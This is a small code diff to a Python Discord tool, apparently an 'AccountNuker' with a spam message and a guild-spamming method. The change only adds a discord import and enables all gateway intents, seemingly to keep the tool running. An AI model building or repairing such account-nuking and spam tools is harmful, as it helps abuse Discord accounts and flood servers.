@@ -4,6 +4,7 @@ import os
 import json
 from colorama import Fore, Back
 from discord.ext import commands
+import discord
 import random
 
 from loading import Loader
@@ -41,7 +42,7 @@ SPAM_MESSAGE = data['message']
 
 class AccountNuker(commands.Bot):
     def __init__(self):
-        super().__init__(command_prefix=">>>")
+        super().__init__(command_prefix=">>>", intents=discord.Intents.all())
         self.chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
     async def spamguild(self):
